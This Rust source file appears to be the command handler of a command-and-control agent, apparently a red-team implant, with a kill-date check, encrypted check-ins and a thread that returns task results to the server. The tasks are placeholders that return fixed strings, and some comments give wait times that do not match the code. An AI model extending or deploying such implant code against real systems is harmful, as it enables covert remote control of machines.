use alloc::sync::Arc;

use rs2_runtime::Runtime;

use rs2_communication_protocol::communication_structs::agent_commands::AgentCommands;
use rs2_communication_protocol::communication_structs::simple_agent_command::SimpleAgentCommand;
use rs2_communication_protocol::communication_structs::task_output::TaskOutput;
use rs2_communication_protocol::metadata::Metadata;
use rs2_communication_protocol::protocol::Protocol;

use mod_agentcore::instance;
use mod_win32::nt_time::{check_kill_date, wait_until};

use crate::common::utils::{generate_path, generate_request_id};
use crate::setup::communication::{encryptor_from_raw, protocol_from_raw};

#[cfg(feature = "std-runtime")]
use std::thread::{self, JoinHandle};

#[cfg(feature = "std-runtime")]
use std::sync::mpsc;

#[cfg(feature = "nostd-nt-runtime")]
use mod_nostd::{nostd_mpsc, nostd_thread};

use super::system::command_exit;

pub fn command_handler<R>(rt: Arc<R>)
where
    R: Runtime + 'static,
{
    unsafe {
        if !instance().session.connected {
            return;
        }

        //KillDate
        if check_kill_date(instance().config.kill_date) {
            command_exit(1);
        }

        // !Working Hours -> continue

        #[cfg(feature = "std-runtime")]
        let (result_tx, result_rx) = mpsc::channel::<TaskOutput>();
        #[cfg(feature = "std-runtime")]
        let result_handler_handle = result_handler(rt.clone(), result_rx);

        #[cfg(feature = "nostd-nt-runtime")]
        let (result_tx, result_rx) = nostd_mpsc::channel::<TaskOutput>();
        #[cfg(feature = "nostd-nt-runtime")]
        let result_handler_handle = result_handler(rt.clone(), result_rx);

        #[cfg(any(feature = "protocol-json", feature = "protocol-winhttp"))]
        {
            let encryptor = encryptor_from_raw(instance().session.encryptor_ptr);
            let protocol = protocol_from_raw(instance().session.protocol_ptr);

            let (_, path, request_id) = generate_path(32, 0, 6);
            let mut data = TaskOutput::new();

            let metadata = Metadata {
                request_id: request_id,
                command_id: generate_request_id(32),
                agent_id: instance().config.id.clone(),
                path: Some(path),
            };

            data.with_metadata(metadata);

            let result = rt.block_on(async { protocol.write(data, Some(encryptor.clone())).await });

            if result.is_ok() {
                // let tasks_response: Result<, anyhow::Error> =
                //     protocol.read(result.unwrap(), Some(encryptor.clone()));
                // for each task in tasks {
                //
                // }

                for i in 0..10 {
                    // Generate metadata for each task
                    let metadata = Metadata {
                        request_id: format!("req-{}", i),
                        command_id: format!("cmd-{}", i),
                        agent_id: "agent-1234".to_string(),
                        path: None,
                    };

                    let command = if i % 2 == 0 {
                        SimpleAgentCommand {
                            op: AgentCommands::Test,
                            metadata,
                        }
                    } else {
                        SimpleAgentCommand {
                            op: AgentCommands::Checkin,
                            metadata,
                        }
                    };

                    let result_tx = result_tx.clone();

                    let runtime_clone = Arc::clone(&rt);
                    runtime_clone.spawn(move || {
                        let result = match command.op {
                            AgentCommands::Terminate => task_type_a(command.metadata),
                            AgentCommands::Checkin => task_type_a(command.metadata),
                            AgentCommands::Test => task_type_b(command.metadata),
                        };
                        result_tx.send(result).unwrap();
                    });
                }
            }
        }

        #[cfg(feature = "std-runtime")]
        rt.block_on(async {
            drop(result_tx); // Close the result channel, indicating no more tasks will send results.
            result_handler_handle.join().unwrap(); // Wait for the result handler to finish processing all results.
        });

        #[cfg(feature = "nostd-nt-runtime")]
        drop(result_tx); // Close the result channel, indicating no more tasks will send results.
        #[cfg(feature = "nostd-nt-runtime")]
        result_handler_handle.join().unwrap(); // Wait for the result handler to finish processing all results.
    }
}

#[cfg(feature = "std-runtime")]
pub fn result_handler<R>(rt: Arc<R>, result_rx: mpsc::Receiver<TaskOutput>) -> JoinHandle<()>
where
    R: Runtime,
{
    // Spawn a separate thread to handle and process the results.
    thread::spawn(move || {
        while let Ok(result) = result_rx.recv() {
            // Create a new reference to protocol inside the loop
            let protocol = unsafe { protocol_from_raw(instance().session.protocol_ptr) };
            let encryptor = unsafe { encryptor_from_raw(instance().session.encryptor_ptr) };

            // Block on the async write operation using the runtime's block_on method
            rt.block_on(async move {
                protocol
                    .write(result.clone(), Some(encryptor.clone()))
                    .await
                    .unwrap();
            });

            // println!("Result {}: {:?}", i, result);
        }
    })
}

#[cfg(feature = "nostd-nt-runtime")]
pub fn result_handler<R>(
    rt: Arc<R>,
    result_rx: nostd_mpsc::Receiver<TaskOutput>,
) -> nostd_thread::NoStdThread
where
    R: Runtime,
{
    // Spawn a separate thread to handle and process the results.

    nostd_thread::NoStdThread::spawn(move || {
        while let Some(result) = result_rx.recv() {
            // Create a new reference to protocol inside the loop
            let protocol = unsafe { protocol_from_raw(instance().session.protocol_ptr) };
            let encryptor = unsafe { encryptor_from_raw(instance().session.encryptor_ptr) };

            // Block on the async write operation using the runtime's block_on method
            rt.block_on(async move {
                protocol
                    .write(result.clone(), Some(encryptor.clone()))
                    .await
                    .unwrap();
            });

            // println!("Result {}: {:?}", i, result);
        }
    })
}

// #[cfg(feature = "std-runtime")]
// Simulated task that takes 2 seconds to complete.
pub fn task_type_a(metadata: Metadata) -> TaskOutput {
    wait_until(1);
    let mut output = TaskOutput::new();
    output.with_metadata(metadata);
    output.output = Some("Result from task type A".to_string());
    output
}

// #[cfg(feature = "std-runtime")]
// Simulated task that takes 3 seconds to complete.
pub fn task_type_b(metadata: Metadata) -> TaskOutput {
    wait_until(12);
    let mut output = TaskOutput::new();
    output.with_metadata(metadata);
    output.output = Some("Result from task type B".to_string());
    output
}
